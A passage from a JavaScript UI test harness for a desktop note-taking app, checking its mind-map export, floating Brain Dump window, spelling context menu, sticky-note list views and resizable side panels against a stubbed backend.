            const pr = pnd.getBoundingClientRect(), p0 = [pc.scrollLeft, pc.scrollTop], pe2 = (t, x, y) => pnd.dispatchEvent(new W.PointerEvent(t, { clientX: x, clientY: y, button: 0, buttons: t === 'pointerup' ? 0 : 1, ctrlKey: true, bubbles: true, cancelable: true, pointerId: 9 }));
            pe2('pointerdown', pr.left + 20, pr.top + 10); pe2('pointermove', pr.left + 80, pr.top + 40); pe2('pointerup', pr.left + 80, pr.top + 40); await wait(10);   // the drag's own click has gone by
            R.pop.ctrl = `Ctrl+drag in its window moved ${Math.round(pc.scrollLeft - p0[0])}, ${Math.round(pc.scrollTop - p0[1])}`; if (Math.abs(pc.scrollLeft - p0[0] + 60) > 2 || Math.abs(pc.scrollTop - p0[1] + 30) > 2) bad('QC 107 Ctrl+drag pans in its window too', R.pop.ctrl); }
          wd.querySelector('[data-act="mm-close"]')?.click(); await wait(10);
          R.pop.ops = `${ops.map(o => o.op + (o.key ? ' ' + o.key : '')).join(', ')} · zoom ${Math.round(pz * 100)}% · close calls ${pcalls.filter(x => x[0] === 'pop_in').map(x => x[1][0]).join() || 'nothing'}`;
          if (!ops.some(o => o.op === 'pick' && o.key === 'item:second goal, from the map#1') || !ops.some(o => o.op === 'fold' && o.key === 'head:goals#1' && o.on === true)) bad('QC 107 a pick and a fold in its window are sent to NeuroVault’s', R.pop.ops);
          if (!mdOp || mdOp.base !== mmMd(n) || !mdOp.md.includes('  - Sub goal A, renamed') || mdOp.md.replace('Sub goal A, renamed', 'Sub goal A') !== mmMd(n)) bad('QC 107 words written in its window are sent as the note with only that line changed', R.pop.ops);
          else { nvSync({ kind: 'mindmap-do', data: mdOp }); if (!n.md.includes('Sub goal A, renamed')) bad('QC 107 …and written into the note', n.md.slice(0, 80)); }
          if (!(pz > 0) || !pcalls.some(x => x[0] === 'pop_in' && x[1][0] === 'mindmap')) bad('QC 107 zoom works in its window; its close docks the map', R.pop.ops);
        }
        fr.remove();
        // the window closes: the map is back beside the note
        POPS.items = [{ kind: 'mindmap', id: null, key: 'mindmap', on_top: true }]; nvSync({ kind: 'popped', items: [], back: null, closed: 'mindmap', gone: null });
        R.pop.docked = `out ${mmOut()} · open ${MM.open} · drawn ${!!app.querySelector('[data-mm-map]')}`; if (mmOut() || !app.querySelector('[data-mm-map]')) bad('QC 107 closing its window puts the map back beside the note', R.pop.docked);
        out.combos++;
      } finally { D.live = keepLive; POPS.items = keepPops; window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : () => Promise.resolve(nm === 'get_settings' ? {} : { status: 'success' }) }) }; } }
    // 11 · QC 107 · Save as… PDF, PNG or JPG (the dialog mocked): the whole map at about 2× (300 dpi for a PDF), the theme's look or white,
    //      the same picture whatever the zoom or place; the Timeline lists it
    { fresh({ screen: '1920x1080' }); R.save = {}; const sent = [], keepVault = VAULT.live;
      window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...a) => { if (nm === 'save_map_image') sent.push(a);
        return Promise.resolve(nm === 'save_map_image' ? (sent.length === 4 ? { status: 'cancelled' } : { status: 'success', name: `Map check – mind map.${a[1]}`, path: 'X' }) : nm === 'list_map_exports' ? [{ id: 1, note_id: 7, title: 'Map check', fmt: 'pdf', name: 'Map check – mind map.pdf', path: 'X', white: true, at: new Date().toISOString() }] : nm.startsWith('list_') ? [] : nm === 'get_settings' ? {} : { status: 'success' }); } }) };
      const img = async b64 => { const im = new Image(); im.src = 'data:image/png;base64,' + b64; await im.decode(); const cv = Object.assign(document.createElement('canvas'), { width: im.naturalWidth, height: im.naturalHeight }), g = cv.getContext('2d'); g.drawImage(im, 0, 0);
        const d = g.getImageData(1, 1, 1, 1).data; return { w: im.naturalWidth, h: im.naturalHeight, corner: [d[0], d[1], d[2], d[3]] }; };
      const rgb = c => (String(c).match(/\d+/g) || []).slice(0, 3).map(Number).join(',');
      try {
        app.querySelector('[data-act="mm-save"]')?.click(); const items = [...app.querySelectorAll('.mm-savemenu [data-act]')].map(b => `${b.dataset.act}${b.dataset.v ? ':' + b.dataset.v : ''}`).join(' ');
        R.save.menu = items; if (items !== 'mm-saveas:pdf mm-saveas:png mm-saveas:jpg mm-white') bad('QC 107 Save as… offers PDF, PNG and JPG, and a white background', items);
        document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true })); if (app.querySelector('.mm-savemenu')) bad('QC 107 Esc closes the Save as menu', '');
        const W = (() => { const b = document.createElement('div'); b.innerHTML = mmWorld(n); return parseFloat(b.querySelector('.mm-world').style.width); })();
        const said = [], save = async (fmt, white) => { MM.white = white; const n0 = sent.length; app.querySelector('[data-act="mm-save"]').click(); app.querySelector(`.mm-savemenu [data-v="${fmt}"]`).click();
          for (let i = 0; i < 100 && (sent.length === n0 || !/^(Saved|Not saved)/.test(S.status)); i++) await wait(30); said.push(S.status); return sent.at(-1); };   // what it says once the save is done (before the 4 s status clears)
        const png = await save('png', false), pdf = await save('pdf', false), jpg = await save('jpg', true), [ip, id, ij] = [await img(png[2]), await img(pdf[2]), await img(jpg[2])];
        const bg = rgb(colorOf('--bg'));
        R.save.sent = `png ${ip.w}×${ip.h} corner ${ip.corner.slice(0, 3)} · pdf ${id.w}×${id.h} at ${pdf[4]} dpi · jpg ${ij.w}×${ij.h} white ${jpg[3]} corner ${ij.corner.slice(0, 3)} · map ${W}px wide · theme bg ${bg} · note ${png[0]}`;
        if (png[1] !== 'png' || pdf[1] !== 'pdf' || jpg[1] !== 'jpg' || png[0] !== rawId(n.id)) bad('QC 107 each format goes to the app with the note', R.save.sent);
        if (Math.abs(ip.w - W * 2) > 1 || Math.abs(id.w - W * 300 / 96) > 1 || Math.abs(ij.w - W * 2) > 1) bad('QC 107 the picture is about 2× (a PDF 300 dpi) of the whole map', R.save.sent);
        if (ip.corner.slice(0, 3).join(',') !== bg || ip.corner[3] !== 255) bad('QC 107 the theme’s look, solid, by default', R.save.sent);
        if (ij.corner.slice(0, 3).join(',') !== '255,255,255' || jpg[3] !== true) bad('QC 107 White background (for printing) is white', R.save.sent);
        R.save.status = said.at(-1); if (!/^Saved “Map check – mind map\.jpg” · in the Timeline$/.test(said.at(-1))) bad('QC 107 a save says where it went', said.join(' | '));
        await save('png', false); R.save.cancel = said.at(-1); if (said.at(-1) !== 'Not saved') bad('QC 107 a cancelled dialog saves nothing', said.join(' | '));
        // whatever the zoom and place: the same picture
        MM.white = false; const c = app.querySelector('[data-mm-canvas]'); mmZoomTo(c, .4); c.scrollLeft = 30; const a1 = mmExport(n, 2, false).canvas.toDataURL();
        mmZoomTo(c, 3); c.scrollLeft = 900; c.scrollTop = 400; const a2 = mmExport(n, 2, false).canvas.toDataURL();
        R.save.view = `same at 40% and 300% ${a1 === a2} · same as what was sent ${a1.split(',')[1] === png[2]}`; if (a1 !== a2 || a1.split(',')[1] !== png[2]) bad('QC 107 zoom and pan don’t change the saved picture', R.save.view);
        // the Timeline
        VAULT.live = true; S.bm.actBusy = false; await bmActivity(); const ev = D.events.find(e => e.id === 'mx-1');
        R.save.timeline = ev ? `${ev.title} · ${ev.desc} · ${ev.type}` : 'not listed'; if (!ev || ev.title !== 'Saved the mind map of “Map check” as PDF' || ev.desc !== 'Map check – mind map.pdf · on a white background') bad('QC 107 the Timeline lists a saved map', R.save.timeline);
        out.combos++;
      } finally { VAULT.live = keepVault; MM.white = false; MM.saveMenu = false; window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : () => Promise.resolve(nm === 'get_settings' ? {} : { status: 'success' }) }) }; } }
  } finally {
    D.notes = D.notes.filter(x => x.id !== 'n-mmcheck'); window.pywebview = was; Object.assign(MM, keepMM, { open: false, sel: null, edit: null, pend: null }); S.mode = 'wysiwyg'; S.modal = null; pnReset(); set({ sample: 'typical', view: 'notes', zen: 'off' });
  }
}
/* ==== end Build M · R57 ==== */
/* ==== Build M · round 6 (R50 answers, 2026-10-18): the Brain Dump as a free window (r49dump float, r49-start, r49-away); the tight
   right-click menu (r49menu, r49-dict); the lists as cards and a timeline (r47list grid, r47-done). Restore asks first: checkBuildM.
   At 1920 × 1080, 1366 × 768 and portrait. The bridge is stubbed: nothing is saved. Runs in the full sweep, or alone with
   ?check=1&only=r6 ==== */
async function checkRound6() {
  const R = out.numbers.round6 = { dump: {}, menu: {}, lists: {} }, bad = (k, v) => iss('Build M round 6: ' + k, v);
  const was = window.pywebview; window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : () => Promise.resolve(n === 'get_settings' ? {} : { status: 'success' }) }) };
  const keepBD = { ...BD }, z = () => app.getBoundingClientRect().width / app.offsetWidth || 1, box = el => { const b = el.getBoundingClientRect(), a = app.getBoundingClientRect(), k = z(); return { x: Math.round((b.left - a.left) / k), y: Math.round((b.top - a.top) / k), w: Math.round(b.width / k), h: Math.round(b.height / k) }; };
  const pt = (type, el, x, y) => el.dispatchEvent(new PointerEvent(type, { clientX: x, clientY: y, button: 0, buttons: 1, bubbles: true, cancelable: true, pointerId: 1 }));
  const drag = (el, dx, dy) => { const b = el.getBoundingClientRect(), x = b.left + Math.min(40, b.width / 2), y = b.top + Math.min(8, b.height / 2), k = z(); pt('pointerdown', el, x, y); pt('pointermove', document, x + dx * k, y + dy * k); pt('pointerup', document, x + dx * k, y + dy * k); };
  try {
    // 1 · the Brain Dump: a free window, first centred over the note; drag, resize, kept on screen, never over the window bar
    for (const sc of ['1920x1080', '1366x768', 'portrait1080']) {
      Object.assign(BD, { mode: 'float', rect: null, saved: [] }); S.dumpDraft = undefined;
      set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true }); openDump();
      const w = app.querySelector('.bd-win'), m = app.querySelector('.app-body > .main'), D0 = R.dump[sc] = {};
      if (!w) { bad('the Brain Dump does not open as a window', sc); continue; }
      const b = box(w), mb = box(m), dx = Math.abs(b.x + b.w / 2 - (mb.x + mb.w / 2)), dy = Math.abs(b.y + b.h / 2 - (mb.y + mb.h / 2));
      D0.first = `${b.w}×${b.h} at ${b.x},${b.y} · off the note's centre ${dx},${dy} · input "${app.querySelector('#dump-input').value}" · focus ${document.activeElement?.id}`;
      if (dx > 2 || dy > 2 || b.w !== 480 || b.h !== 360) bad('the first open is 480 × 360, centred over the note', `${sc}: ${D0.first}`);
      if (app.querySelector('#dump-input').value !== '' || document.activeElement?.id !== 'dump-input') bad('an empty draft (never "undefined"), the caret in the box', `${sc}: ${D0.first}`);
      if (app.querySelectorAll('.bd-win [data-bd-rz]').length !== 8 || !app.querySelector('.bd-win [data-bd-drag]')) bad('eight resize zones and a head to drag', sc);
      drag(app.querySelector('[data-bd-drag]'), -120, 60); let a = box(app.querySelector('.bd-win'));
      D0.moved = `${a.x},${a.y} (saved ${JSON.stringify(BD.saved.at(-1))})`; if (a.x !== b.x - 120 || a.y !== b.y + 60 || BD.rect?.x !== a.x || !BD.saved.length) bad('dragging the head moves it and keeps the place', `${sc}: ${D0.moved}`);
      if (!app.querySelector('.bd-win')) bad('the click that ends a drag closes the window', sc);
      drag(app.querySelector('[data-bd-rz="se"]'), 90, 50); a = box(app.querySelector('.bd-win')); D0.sized = `${a.w}×${a.h}`;
      if (a.w !== 570 || a.h !== 410) bad('pulling the corner sizes it', `${sc}: ${D0.sized}`);
      drag(app.querySelector('[data-bd-rz="nw"]'), 600, 600); a = box(app.querySelector('.bd-win')); D0.min = `${a.w}×${a.h}`;
      if (a.w !== 360 || a.h !== 220) bad('never smaller than 360 × 220', `${sc}: ${D0.min}`);
      drag(app.querySelector('[data-bd-drag]'), -5000, -5000); a = box(app.querySelector('.bd-win')); const bar = app.querySelector('.titlebar').offsetHeight; D0.corner = `${a.x},${a.y} (bar ${bar})`;
      if (a.x < 4 || a.y < bar + 4) bad('kept on screen, never over the window bar', `${sc}: ${D0.corner}`);
      drag(app.querySelector('[data-bd-drag]'), 5000, 5000); a = box(app.querySelector('.bd-win'));
      if (a.x + a.w > app.offsetWidth - 4 || a.y + a.h > app.offsetHeight - 4) bad('kept on screen at the far corner', `${sc}: ${a.x},${a.y} ${a.w}×${a.h}`);
      const hd = app.querySelector('[data-bd-drag]'); hd.focus(); const k0 = box(app.querySelector('.bd-win'));
      hd.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowLeft', bubbles: true, cancelable: true })); hd.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowUp', shiftKey: true, bubbles: true, cancelable: true }));
      a = box(app.querySelector('.bd-win')); D0.keys = `${k0.x}→${a.x}, h ${k0.h}→${a.h}`; if (a.x !== k0.x - 16 || a.h !== Math.max(220, k0.h - 16)) bad('the arrow keys move it, Shift + arrows size it', `${sc}: ${D0.keys}`);
      // a click elsewhere closes it and keeps the draft; it comes back where it was
      const inp = app.querySelector('#dump-input'); inp.value = 'call the dentist'; inp.dispatchEvent(new Event('input', { bubbles: true }));
      const place = box(app.querySelector('.bd-win')); await wait(0); app.querySelector('.doc')?.click();   // a tick after the last drag (its own click is swallowed) D0.away = `open ${!!app.querySelector('.bd-win')} · draft "${S.dumpDraft}"`;
      if (app.querySelector('.bd-win') || S.modal || S.dumpDraft !== 'call the dentist') bad('a click elsewhere closes it, keeping the draft', `${sc}: ${D0.away}`);
      openDump(); a = box(app.querySelector('.bd-win')); D0.back = `${a.x},${a.y} ${a.w}×${a.h} · "${app.querySelector('#dump-input').value}"`;
      if (a.x !== place.x || a.y !== place.y || a.w !== place.w || app.querySelector('#dump-input').value !== 'call the dentist') bad('it opens again where it was, with the draft', `${sc}: ${D0.back}`);
      document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true })); if (S.modal === 'dump') { closeModal(); }
      if (S.dumpDraft !== 'call the dentist') bad('Esc keeps the draft', sc);
      measure('round6 dump ' + sc); out.combos++;
    }
    // centred dialog (the setting's other choice): at the top, no zones, no drag; Settings → Vault & files has both rows
    { BD.mode = 'centre'; set({ screen: '1920x1080', modal: null }); openDump(); const w = app.querySelector('.bd-win'), a = box(w);
      R.dump.centre = `${a.w}×${a.h} at ${a.x},${a.y} · zones ${w.querySelectorAll('[data-bd-rz]').length} · drag ${!!w.querySelector('[data-bd-drag]')}`;
      if (Math.abs(a.x + a.w / 2 - app.offsetWidth / 2) > 1 || w.querySelector('[data-bd-rz], [data-bd-drag]')) bad('Centred dialog: centred, nothing to drag', R.dump.centre);
      closeModal(); BD.mode = 'float'; BD.rect = { x: 300, y: 200, w: 500, h: 300 }; S.setSec = 'vault'; set({ modal: 'settings' });
      const rows = [...app.querySelectorAll('.settings-pane .bd-set .set-label')].map(x => x.textContent), seg = [...app.querySelectorAll('[data-act="bd-mode"]')].map(b => b.textContent + (b.getAttribute('aria-pressed') === 'true' ? '*' : ''));
      R.dump.settings = `${rows.join(' | ')} · ${seg.join('/')}`; if (rows.join('|') !== 'Brain Dump opens as|Its place' || seg.join('/') !== 'Free window*/Centred dialog') bad('Settings → Vault & files: how the Brain Dump opens', R.dump.settings);
      app.querySelector('[data-act="bd-reset"]').click(); if (BD.rect) bad('Put it back in the middle forgets the place', JSON.stringify(BD.rect)); S.modal = null; renderAll(); }

    // 2 · the right-click menu, tight: 28px rows, 248px, the spellings on top, one line under them, no "Open in the dictionary", keys on the right
    for (const sc of ['1920x1080', '1366x768']) for (const kind of ['misspelt', 'plain', 'field']) {
      set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); const key = `${sc}/${kind}`;
      S.ctx = { kind: 'word', word: kind === 'misspelt' ? 'recieve' : 'outage', x: 200, y: 160, cx: 200, cy: 160, ...(kind === 'field' ? { field: '#note-tags-input', start: 0, end: 0 } : {}),
        spell: kind === 'misspelt' ? { known: false, suggestions: [{ word: 'receive' }, { word: 'relieve' }] } : { known: true, suggestions: [] } }; renderAll();
      const m = app.querySelector('.menu--word'); if (!m) { bad('the menu does not open', key); continue; }
      const items = [...m.querySelectorAll('.menu-item')], hs = new Set(items.map(b => Math.round(b.getBoundingClientRect().height / z()))), labels = items.map(b => b.querySelector('.truncate')?.textContent);
      const keys = items.map(b => b.querySelector('.menu-key')?.textContent).filter(Boolean), first = m.firstElementChild, sug = m.querySelectorAll('.menu-sug');
      R.menu[key] = `${Math.round(m.getBoundingClientRect().width / z())}px · rows ${[...hs]} · ${labels.join(' | ')} · keys ${keys.join(' ')}`;
      if ([...hs].join() !== '28' || Math.round(m.getBoundingClientRect().width / z()) !== 248) bad('28px rows, 248px wide', R.menu[key]);
      if (/dictionary/i.test(m.textContent)) bad('"Open in the dictionary" is gone (Look up has it)', R.menu[key]);
      if (keys.join(' ') !== 'Ctrl+X Ctrl+C Ctrl+V Ctrl+A F7') bad('Cut, Copy, Paste, Select all and Check spelling with their keys', R.menu[key]);   // parity: Select all
      const kr = items.filter(b => b.querySelector('.menu-key')).map(b => Math.round(b.getBoundingClientRect().right - b.querySelector('.menu-key').getBoundingClientRect().right)); if (new Set(kr).size > 1) bad('the keys line up on the right', `${key}: ${kr}`);
      if (kind === 'misspelt') { if (sug.length !== 2 || first !== sug[0] || !sug[1].nextElementSibling?.matches('.menu-sep') || getComputedStyle(sug[0]).color === getComputedStyle(items.at(-1)).color || !labels.includes('Ignore in this note')) bad('the spellings on top in the accent colour, one line under them, Ignore', R.menu[key]); }
      else if (sug.length || first?.matches('.menu-sep')) bad('a word spelt right has no spellings or line on top', R.menu[key]);
      if (!labels.some(l => /^Look up/.test(l))) bad('Look up is there', R.menu[key]);
      if (kind === 'field' && labels.includes('Ignore in this note')) bad('a field has no Ignore in this note', R.menu[key]);
      if (/Windows/.test(m.innerHTML)) bad('no Windows menu, so no hint about it (parity, R51 r49-hint)', key);
      S.ctx = null; renderAll(); out.combos++; }

    // 3 · the lists: sticky cards in their own colours; Brain Dump by day with the time on the left; a ticked thought stays, greyed
    for (const sc of ['1920x1080', '1366x768', 'portrait1080']) {
      set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); ldShow('stickies'); await wait(0);
      const cards = [...app.querySelectorAll('.ld-grid .ld-card')], L = R.lists[sc] = {};
      const colours = cards.map(c => getComputedStyle(c).backgroundColor), want = D.stickies.slice().sort((a, b) => b.n - a.n).map(s => getComputedStyle(app).getPropertyValue('--sticky-' + s.color).trim());
      L.stickies = `${cards.length} cards · ${new Set(colours).size} colours · columns ${getComputedStyle(app.querySelector('.ld-grid')).gridTemplateColumns.split(' ').length}`;
      if (!cards.length || cards.length !== D.stickies.length) bad('every sticky is a card', `${sc}: ${L.stickies}`);
      const hex = c => { const m = c.match(/\d+/g); return m ? '#' + m.slice(0, 3).map(v => (+v).toString(16).padStart(2, '0')).join('') : c; };
      if (colours.some((c, i) => hex(c) !== want[i].toLowerCase())) bad('each card in its sticky’s colour', `${sc}: ${colours.map(hex)} vs ${want}`);
      if (cards.some(c => c.querySelector('.ld-card-text').scrollWidth > c.querySelector('.ld-card-text').clientWidth + 1 || !c.querySelector('[data-act="ld-open"]') || !c.querySelector('[data-act="ld-menu"]'))) bad('a card shows its text, Show / Reopen and ⋮', sc);
      measure('round6 stickies ' + sc);
      LD.list = 'inbox'; LD.done = [{ id: 'in-done', t: '08:05', day: todayKey(), text: 'Book the train', done: true }]; LD.doneFor = 'live'; renderAll(); await wait(0);
      const days = [...app.querySelectorAll('.ld-tl .ld-day')], rows = [...app.querySelectorAll('.ld-tl [data-ld-item]')], done = app.querySelector('.ld-tl .ld-item.is-done');
      L.inbox = `${days.map(d => d.querySelector('.day-head').textContent + ' ' + d.querySelectorAll('[data-ld-item]').length).join(', ')} · times ${rows.slice(0, 3).map(r => r.querySelector('.ld-time')?.textContent).join(' ')}`;
      if (!days.length || rows.some(r => !r.querySelector('.ld-time'))) bad('Brain Dump is a timeline by day, the time on the left', `${sc}: ${L.inbox}`);
      if (!done || getComputedStyle(done.querySelector('.ld-text')).textDecorationLine !== 'line-through') bad('a ticked thought stays, greyed', `${sc}: ${L.inbox}`);
      const q = app.querySelector('#ld-q'); q.value = 'zzzz-nothing'; q.dispatchEvent(new Event('input', { bubbles: true })); L.search = `${days.filter(d => !d.hidden).length} days shown`;
      if (app.querySelectorAll('.ld-tl .ld-day:not([hidden])').length) bad('a search hides the days with nothing found', `${sc}: ${L.search}`);
      q.value = ''; q.dispatchEvent(new Event('input', { bubbles: true })); LD.done = []; LD.doneFor = null; measure('round6 inbox ' + sc); ldClose(); out.combos++;
    }

    // 4 · QC 54: a blue style hint ("quite") and a spelling mark get "Ignore in this note" on the right-click menu; the mark goes for
    //     that note only, with Undo (Build L's bar) that brings it back
    { R.qc54 = {}; set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null }); const n = note(), keepMd = n.md, keepIgn = JSON.stringify(DJS.ignore), other = D.notes.find(x => x !== n);
      n.md = 'It is quite good, and I recieve it.'; n.html = null; if (other) { other.md = 'This is quite fine.'; other.html = null; } S.a11y.homophones = true; S.a11y.spell = true; renderAll();
      for (const [kind, word, cls] of [['style', 'quite', 'homophone'], ['spelling', 'recieve', 'spell']]) {
        const mark = () => app.querySelector(`.doc [data-word="${word}"].${cls}`), had = !!mark();
        S.ctx = { kind: 'word', word, node: mark()?.firstChild, offset: 1, noteId: n.id, style: kind === 'style', x: 200, y: 160, cx: 200, cy: 160, spell: kind === 'spelling' ? { known: false, suggestions: [{ word: 'receive' }] } : { known: true, suggestions: [] } }; renderAll();
        const ig = app.querySelector('.menu--word [data-act="ctx-ignore"]'), c = S.ctx; djCtxRun('ctx-ignore', c); renderAll();
        const gone = !mark(), undo = app.querySelector('[data-act="hold-undo"]'), inOther = other ? mdToHtml(other).includes(`class="homophone" data-word="quite"`) : true;
        undo?.click(); renderAll(); const back = !!mark();
        R.qc54[kind] = `mark ${had} · menu Ignore ${!!ig} · gone ${gone} · Undo bar ${!!undo} · back after Undo ${back} · other note still marked ${inOther}`;
        if (!had || !ig || !gone || !undo || !back || (kind === 'style' && !inOther)) bad(`QC 54 Ignore in this note for a ${kind} mark, with Undo`, R.qc54[kind]); out.combos++; }
      { S.ctx = { kind: 'word', word: 'good', node: null, offset: 0, noteId: n.id, style: false, x: 200, y: 160, cx: 200, cy: 160, spell: { known: true, suggestions: [] } }; renderAll();
        if (app.querySelector('.menu--word [data-act="ctx-ignore"]')) bad('QC 54 a plain word has no Ignore in this note', ''); S.ctx = null; renderAll(); }
      n.md = keepMd; n.html = null; if (other) { other.html = null; } DJS.ignore = JSON.parse(keepIgn); if (HOLD.cur) { clearTimeout(HOLD.cur.t); HOLD.cur = null; } renderAll(); }

    // 5 · QC 55: Open file takes notes, PDF / Word (converted) and PNG / JPEG (a note each); the icon sits right of New sticky note
    { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, zen: 'off' }); const caps = [...app.querySelectorAll('.titlebar .tb-caps [data-act]')].map(b => b.dataset.act), ob = app.querySelector('.titlebar [data-act="md-open"]');
      R.qc55 = { caps: caps.join(' '), tip: ob?.title, key: KEYS.find(k => k.sel?.includes('md-open'))?.l };
      if (caps.join(' ') !== 'sticky-new md-open dump voice wrap' ||   // R54 C: Daily wrap-up after Voice ramble
        app.querySelectorAll('.titlebar [data-act="md-open"]').length !== 1) bad('QC 55 the Open file icon sits right of New sticky note', R.qc55.caps);
      if (!/PDF/.test(ob?.title || '') || !/ · Ctrl\+O$/.test(ob?.title || '') || !/PDF/.test(R.qc55.key || '')) bad('QC 55 the tooltip and Settings say what it opens', `${ob?.title} · ${R.qc55.key}`);
      const got = [], k0 = { mdImport, doAttach, doConvert, toast };
      mdImport = async p => { got.push('md:' + p.map(fileName).join('+')); return []; }; doAttach = async f => { got.push('image:' + f.map(x => x.name).join('+')); }; doConvert = async p => { got.push('convert:' + fileName(p)); }; toast = m => { got.push('said:' + (m.match(/“[^”]+”/)?.[0] || m)); };   // eslint-disable-line no-global-assign
      try { await openPaths(['C:/v/a.md', 'C:/v/b.PDF', 'C:/v/c.docx', 'C:/v/d.png', 'C:/v/e.JPG', 'C:/v/f.jpeg', 'C:/v/g.txt', 'C:/v/h.zip']); }
      finally { ({ mdImport, doAttach, doConvert, toast } = k0); }   // eslint-disable-line no-global-assign
      R.qc55.routes = got.join(' · ');
      if (R.qc55.routes !== 'said:“h.zip” · md:a.md+g.txt · image:d.png · image:e.JPG · image:f.jpeg · convert:b.PDF · convert:c.docx') bad('QC 55 each kind goes its way (an image, a note each)', R.qc55.routes); out.combos++; }

    // 6 · QC 61: the chrome is never selectable; a double-click below a short note's text puts the caret at its end and selects
    //     nothing outside the editor (it selected the status bar's "TIMELINE")
    { R.qc61 = {}; for (const sc of ['1920x1080', '1366x768']) {
        set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true }); const n = note(), keepMd = n.md; n.md = 'A short note.'; n.html = null; renderAll();
        const sel = ['.status-bar', '.status-bar .trail-label', '.titlebar', '.rail', '.app-header', '.side-actions', '.ed-toolbar', '.eyebrow', '[data-tree]'];
        const us = sel.map(q => [q, app.querySelector(q) && getComputedStyle(app.querySelector(q)).userSelect]).filter(x => x[1] != null), doc = app.querySelector('.view--note .doc[contenteditable="true"]');
        const open = us.filter(x => x[1] !== 'none').map(x => x[0]); R.qc61[sc] = { chrome: open.length ? 'selectable: ' + open.join(' ') : `${us.length} parts not selectable`, doc: getComputedStyle(doc).userSelect };
        if (open.length || getComputedStyle(doc).userSelect === 'none') bad('QC 61 the chrome is never selectable, the note is', `${sc}: ${R.qc61[sc].chrome} · note ${R.qc61[sc].doc}`);
        const last = [...doc.children].filter(k => k.getClientRects().length).at(-1).getBoundingClientRect(), view = app.querySelector('.view--note').getBoundingClientRect(), x = (last.left + last.right) / 2, y = Math.min(last.bottom + 60, view.bottom - 20);
        const el = document.elementFromPoint(x, y), ev = new MouseEvent('mousedown', { clientX: x, clientY: y, button: 0, detail: 2, bubbles: true, cancelable: true });
        getSelection().removeAllRanges(); el.dispatchEvent(ev);
        const s0 = getSelection(), r0 = s0.rangeCount && s0.getRangeAt(0), inside = !!r0 && doc.contains(r0.startContainer) && doc.contains(r0.endContainer);
        const atEnd = !!r0 && r0.collapsed && (() => { const t = document.createRange(); t.selectNodeContents(doc); t.setStart(r0.endContainer, r0.endOffset); return !t.toString().trim().length; })();   // the page's line break after the last block doesn't count
        R.qc61[sc].dbl = `on ${el?.className || el?.tagName} · stopped ${ev.defaultPrevented} · selection in the note ${inside} · caret at the end ${atEnd}`;
        if (!ev.defaultPrevented || !inside || !atEnd) bad('QC 61 a double-click below the text puts the caret at the end, selecting nothing else', `${sc}: ${R.qc61[sc].dbl}`);
        n.md = keepMd; n.html = null; renderAll(); out.combos++; } }

    // 7 · parity: the side panels resize (drag, ← →, 200–480, double-click for the default), and the window bar follows
    { R.panels = {}; const keepP = { side: PAR.side, insp: PAR.insp }; PAR.saved = [];
      for (const sc of ['1920x1080', '1366x768']) {
        set({ screen: sc, sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true, inspector: 'shown' }); PAR.side = null; PAR.insp = null; parWidths(); renderAll();
        const w = k => Math.round((k === 'side' ? app.querySelector('#left-sidebar') : app.querySelector('.app-body > .inspector')).getBoundingClientRect().width / parZoom());
        const h = k => app.querySelector(`[data-par-resize="${k}"]`), w0 = { side: w('side'), insp: w('insp') }, key = (k, kk) => h(k).dispatchEvent(new KeyboardEvent('keydown', { key: kk, bubbles: true, cancelable: true }));
        key('side', 'ArrowRight'); key('insp', 'ArrowRight'); renderAll(); const w1 = { side: w('side'), insp: w('insp') };
        const z = parZoom(), b = h('side').getBoundingClientRect(), pt = (t, x) => h('side').dispatchEvent(new PointerEvent(t, { clientX: x, clientY: b.top + 50, button: 0, bubbles: true, cancelable: true, pointerId: 1 }));
        pt('pointerdown', b.left + 3); pt('pointermove', b.left + 3 + 120 * z);   // mid-drag, no redraw: the full-width toolbar still fits the narrower note area
        { const tb = app.querySelector('.view-inner > .ed-toolbar'), v = app.querySelector('.view--note'), tr = tb?.getBoundingClientRect(), vr = v?.getBoundingClientRect(), vin = vr && vr.right - (v.offsetWidth - v.clientWidth) * z;
          R.panels[sc + ' toolbar'] = tr ? `toolbar ${Math.round(tr.left)}–${Math.round(tr.right)} in the note area ${Math.round(vr.left)}–${Math.round(vin)}` : 'no toolbar';
          if (!tr || tr.right > vin + .5 || tr.left < vr.left - .5) bad('the toolbar follows a side panel as you drag it', `${sc}: ${R.panels[sc + ' toolbar']}`); }
        pt('pointermove', b.left + 3 + 500 * z); pt('pointerup', b.left + 3 + 500 * z); renderAll(); const wMax = w('side'), tbl = Math.round(app.querySelector('.titlebar .tb-left').getBoundingClientRect().width / z);   // the tabs start at the note's edge (QC 65: the icons don't move; section 12)
        key('side', 'Home'); renderAll(); const wMin = w('side'); const rail = Math.round(app.querySelector('.rail').getBoundingClientRect().width / z);
        h('side').dispatchEvent(new MouseEvent('dblclick', { bubbles: true, cancelable: true })); renderAll(); const wBack = w('side');
        R.panels[sc] = `side ${w0.side}→${w1.side} (→ key), drag ${wMax}, Home ${wMin}, tabs start ${tbl} = rail ${rail} + ${wMax}, default again ${wBack} · right ${w0.insp}→${w1.insp} · saved ${PAR.saved.length}`;
        if (w1.side !== w0.side + 16 || w1.insp !== w0.insp - 16 || wMax !== 480 || wMin !== 200 || tbl !== rail + wMax || wBack !== w0.side || !PAR.saved.length) bad('the side panels resize, 200–480, kept, and the tabs follow', `${sc}: ${R.panels[sc]}`);
        if (h('side').getAttribute('role') !== 'separator' || !h('side').hasAttribute('tabindex')) bad('the line is a separator you can reach by Tab', sc);
        out.combos++; }
      PAR.side = keepP.side; PAR.insp = keepP.insp; parWidths(); }

